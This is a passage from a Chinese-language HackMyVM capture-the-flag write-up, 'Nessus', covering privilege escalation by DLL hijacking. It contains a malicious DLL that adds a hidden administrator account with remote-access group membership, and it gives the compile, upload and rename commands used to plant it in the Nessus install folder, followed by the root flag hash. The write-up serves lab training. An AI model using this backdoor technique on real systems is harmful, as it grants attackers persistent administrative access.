system(<span class=\"hljs-string\">\"net user sunset sunset /add\"</span>);\n    i = system(<span class=\"hljs-string\">\"net localgroup administrators sunset /add\"</span>);\n    i = system(<span class=\"hljs-string\">\"net localgroup 'remote management' sunset /add\"</span>);\n    i = system(<span class=\"hljs-string\">\"net localgroup 'remote desktop' sunset /add\"</span>);\n    <span class=\"hljs-keyword\">break</span>;\n  <span class=\"hljs-keyword\">case</span> DLL_THREAD_ATTACH: <span class=\"hljs-comment\">// A process is creating a new thread.</span>\n    <span class=\"hljs-keyword\">break</span>;\n  <span class=\"hljs-keyword\">case</span> DLL_THREAD_DETACH: <span class=\"hljs-comment\">// A thread exits normally.</span>\n    <span class=\"hljs-keyword\">break</span>;\n  <span class=\"hljs-keyword\">case</span> DLL_PROCESS_DETACH: <span class=\"hljs-comment\">// A process unloads the DLL.</span>\n    <span class=\"hljs-keyword\">break</span>;\n  }\n  <span class=\"hljs-keyword\">return</span> TRUE;\n}\n</code></pre>\n<p>将其编译为<code>DLL</code>文件,使用<code>x86_64-w64-mingw32-gcc.exe</code> 可以生成64位<code>windows</code>的<code>DLL</code>文件</p>\n<pre><code class=\"hljs language-c\">PS C:\\Program Files\\mingw64\\bin> .\\x86_64-w64-mingw32-gcc.exe .\\adduser.c --shared -o adduser.dll -lnetapi32\n</code></pre>\n<p>将其上传到靶机，再将名字改为<code>VCRUNTIME140.dll</code></p>\n<pre><code class=\"hljs language-c\">*Evil-WinRM* PS C:\\program files\\tenable\\nessus> upload adduser.dll ./VCRUNTIME140.dll\n</code></pre>\n<p>重启检查一下用户是否创建成功，没成功…</p>\n<p>随后尝试将劫持的DLL改为<code>legacy.dll</code></p>\n<pre><code class=\"hljs language-c\">*Evil-WinRM* PS C:\\program files\\tenable\\nessus> mv legacy.dll legacy.dll.bak;mv VCRUNTIME140.dll legacy.dll\n</code></pre>\n<p>重启，尝试登录用户，成功登录！！</p>\n<pre><code class=\"hljs language-c\">evil-winrm -i <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.8</span> -u sunset -p sunset\n                                        \nEvil-WinRM shell v3.<span class=\"hljs-number\">7</span>\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n                                        \nData: For more information, check Evil-WinRM GitHub: https:<span class=\"hljs-comment\">//github.com/Hackplayers/evil-winrm#Remote-path-completion</span>\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\sunset\\Documents> \n</code></pre>\n<h2>ROOT Flag</h2>\n<p>读取<code>root flag</code></p>\n<pre><code class=\"hljs language-c\">*Evil-WinRM* PS C:\\Users\\administrator\\DEsktop> type root.txt\nb5fc5a4ebfc20cc18220a814e1aee0aa\n</code></pre>\n<h2>为什么劫持<code>VCRUNTIME140.dll</code> 会失败？</h2>\n<p>可能的</p>\n<p>现代操作系统或应用程序可能启用了各种防护机制（如ASLR、SafeDllSearchMode等），这些机制可能会影响DLL的加载\n如果使用 <code>legacy.dll</code> 成功，可能是因为这个DLL并没有被目标程序明确要求或者它的加载顺序不同于 <code>VCRUNTIME140.dll</code>。<code>legacy.dll</code> 可能与目标程序的兼容性较高，或者它没有被防护机制所拦截。</p>\n<p>可以看到<code>VCRUNTIME140.dll</code> 被调用了特定的函数</p>\n<p><img src=\"/post-images/HackMyVMNessus/image19.png\" alt=\"image.png\"></p>\n<p>如果你的劫持DLL未正确实现这些函数，应用程序在调用时可能会崩溃或拒绝加载你的DLL</p>","title":"HackMyVM - Nessus","date":"2025-04-03","updated":"2025-04-03","comments":true,"tags":["HackMyVM","Linux靶机"],"categories":"靶机"},"recentPosts":[{"title":"HackTheBox - Machine - Bucket","slug":"HackTheBoxMachine - Bucket","date":"2025-06-06","updated":"2025-06-06","isEncrypted":false},{"title":"HackTheBox - Machine -Support","slug":"HackTheBoxMachine -Support","date":"2025-06-05","updated":"2025-06-05","isEncrypted":false},{"title":"HackTheBox - Machine - Hospital","slug":"HackTheBoxMachine - Hospital","date":"2025-06-04","updated":"2025-06-04","isEncrypted":false},{"title":"HackTheBox - Season8 - Certificate","slug":"HackTheBoxSeason8 - Certificate","date":"2025-06-02","updated":"2025-06-02","isEncrypted":true},{"title":"HackTheBox - Machine - Strutted","slug":"HackTheBoxMachine - Strutted","date":"2025-06-02","updated":"2025-06-02","isEncrypted":false}]},"__N_SSG":true}